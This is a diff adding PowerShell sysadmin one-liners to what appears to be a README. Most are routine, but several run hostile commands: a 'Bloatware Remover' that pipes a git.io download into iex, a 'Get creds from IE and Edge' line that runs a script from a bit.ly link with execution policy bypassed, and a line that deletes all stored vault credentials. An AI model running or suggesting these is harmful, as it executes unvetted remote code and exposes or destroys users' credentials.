@@ -2,3 +2,40 @@
 SysAdmin stuff using the all powerful powershell
 
 ## One-Liners
+
+#### "Pong Command" - Listen for Pings. Uses WinDump.exe
+```.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo```
+
+#### Enable File and Printer Sharing
+```Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True```
+
+#### Enable ICMP
+```netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ```
+
+#### Remote Manage
+```reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
+
+#### Bloatware Remover
+```iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))```
+
+#### Get creds from IE and Edge
+```powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"```
+```
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] $vault = New-Object Windows.Security.Credentials.PasswordVault $vault.RetrieveAll() | ForEach {$vault.Remove($_)}
+```
+
+#### Count Mailboxes based on office or chosen property
+
+```Get-Mailbox | Group-Object -Property:Office | Select-Object name,count```
+
+#### Get all PC Names according to pattern (requires activedirectory module)
+``` Get-ADComputer -Filter "Name -like 'PC-*'" | Select-String -Pattern PC-\d+```
+
+#### Enable Hyper-V
+```Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All```
+
+#### Toggle SMBv1
+```Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force```
+
+#### Enable script execution 
+```powershell.exe Set-ExecutionPolicy Bypass -Force```
